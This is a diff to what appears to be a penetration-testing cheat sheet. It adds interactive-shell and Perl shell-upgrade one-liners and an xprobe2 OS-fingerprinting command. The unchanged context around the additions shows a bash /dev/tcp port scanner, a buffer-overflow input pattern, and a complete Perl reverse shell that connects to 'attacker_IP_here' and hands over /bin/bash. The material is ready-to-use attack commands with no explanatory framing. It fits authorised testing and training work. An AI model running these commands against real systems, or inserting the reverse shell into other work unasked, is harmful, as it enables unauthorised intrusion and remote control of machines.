@@ -438,6 +438,8 @@ stty rows no_rows_here columns no_columns_here
 
 # stabilize shell
 /usr/bin/script -qc /bin/bash /dev/null
+/bin/sh -i
+/bin/bash -i
 
 # scan
 host=target_IP_here; echo "--- scan starting ---"; for port in {1..65535}; do timeout .1 bash -c "echo >/dev/tcp/$host/$port" && echo "port $port is open"; done; echo "--- scan finished ---"
@@ -2411,6 +2413,9 @@ $(perl -e 'print "\x41" x 20 . "ABCD"')
 
 # reverse shell
 perl -e 'use Socket;$i="attacker_IP_here";$p=port_here;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+
+# upgrade shell
+perl -e 'exec "/bin/bash"'
 ```
 
 
@@ -3775,6 +3780,14 @@ xfreerdp /u:user_here /p:password_here /cert:ignore /v:IP_here
       </param>
     </params>
 </methodCall>
+```
+
+
+
+## XPROBE2
+```
+# probe service on remote host for OS
+xprobe2 -v -p tcp:port_here:open IP_here
 ```
 
 
